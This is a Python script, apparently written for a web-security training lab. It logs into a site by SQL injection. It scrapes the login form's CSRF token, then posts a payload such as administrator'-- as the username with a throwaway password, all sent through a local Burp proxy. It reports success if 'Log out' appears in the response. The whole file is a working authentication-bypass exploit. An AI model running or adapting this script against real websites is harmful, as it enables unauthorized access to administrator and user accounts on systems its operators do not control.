import requests
import urllib3
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# burp suite is between the script and source

proxies = { 'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080' }

# get csrf 
def get_csrf(s, url):
    print("[+] Inside Get CSRF")
    r = s.get(url, verify=False, proxies=proxies)
    # get from the session
    soup = BeautifulSoup(r.text, 'html.parser')
    # find csrf from input tag
    csrf = soup.find("input")['value']
    return csrf


def exploit_sqli(s, url, payload):
    print("[+] Inside Expolit Sqli")
    csrf = get_csrf(s, url)
    print(csrf)
    # data is needed to authenticate the user
    # password can be random because it is commented
    data = {"csrf": csrf,
            "username": payload,
            "password": "sfgf"}
    print(data)
    # post the data in the url
    r = s.post(url, data=data, verify=False, proxies=proxies)
    # search for 'Log out' string
    if "Log out" in r.text:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip() # url
        payload = sys.argv[2].strip() # payload is administrator'--
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "administrator"' % sys.argv[0])
        sys.exit(-1)

    # csrf token changes with every session
    # csrf token is needed to authenticate the user
    s = requests.Session()

    if exploit_sqli(s, url, payload):
        print("[+] SQL injection successfully logged in as administrator")
    else:
        print("[-] SQL injection unsuccessful")
